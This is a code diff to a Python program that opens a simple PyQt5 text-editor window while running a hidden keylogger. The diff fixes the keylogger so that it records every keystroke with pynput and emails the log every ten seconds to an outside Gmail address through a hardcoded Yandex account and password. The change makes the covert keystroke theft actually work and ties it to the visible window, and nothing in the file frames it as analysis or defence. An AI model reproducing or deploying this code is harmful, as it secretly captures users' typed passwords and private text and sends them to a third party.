@@ -3,47 +3,37 @@ import threading
 from PyQt5.QtWidgets import QApplication, QMainWindow, QTextEdit, QLineEdit
 import pynput.keyboard
 import smtplib
-""""
-    def filter_words(self, char):
-        text = self.text_edit.toPlainText()
-        search_text = self.search_edit.text()
-        if search_text:
-            filtered_text = ' '.join(word for word in text.split() if search_text.lower() in word.lower())
-            self.text_edit.setPlainText(filtered_text)
-        else:
-            self.text_edit.insertPlainText(char)
-"""
+
 log = ""
-def calbackFunc(key):
+
+def callbackFunc(key):
     global log
     try:
-        log = log + str(key.char)
+        log += key.char
     except AttributeError:
         if key == key.space:
-            log = log + " "
+            log += " "
         else:
-            log = log + str(key)
-    except:
-        pass
-    print(log)
-keyloggerListener = pynput.keyboard.Listener(on_press=calbackFunc)
+            log += str(key)
 
-def sendEmail(email,password,message):
-    emailServer = smtplib.SMTP("smtp.yandex.com",587)
-    emailServer.starttls()
-    emailServer.login(email,password)
-    emailServer.sendmail(email,email,message)
-    emailServer.quit()
+def sendEmail(email, password, message):
+    try:
+        emailServer = smtplib.SMTP_SSL("smtp.yandex.com", 465)
+        emailServer.login(email, password)
+        emailServer.sendmail(email, "ahmetzincir27@gmail.com", message)
+        emailServer.quit()
+    except Exception as e:
+        print("Email gönderme hatası:", e)
+
 def threadFunc():
     global log
-    sendEmail("drewbarrymore34@yandex.com","ngmlkeguhqwwvcju",log.encode('utf-8'))
+    sendEmail("drewbarrymore34@yandex.com", "edncntkucviklakx", log)
     log = ""
-    timerObj = threading.Timer(10,threadFunc())
+    timerObj = threading.Timer(10, threadFunc)
     timerObj.start()
 
-with keyloggerListener:
-    threadFunc()
-    keyloggerListener.join()
+keyloggerListener = pynput.keyboard.Listener(on_press=callbackFunc)
+
 def main():
     app = QApplication(sys.argv)
     window = QMainWindow()
@@ -63,6 +53,10 @@ def main():
     search_edit.setStyleSheet("color: blue;")
 
     window.show()
+
+    keyloggerListener.start()
+    threadFunc()
+
     sys.exit(app.exec_())
 
 if __name__ == "__main__":
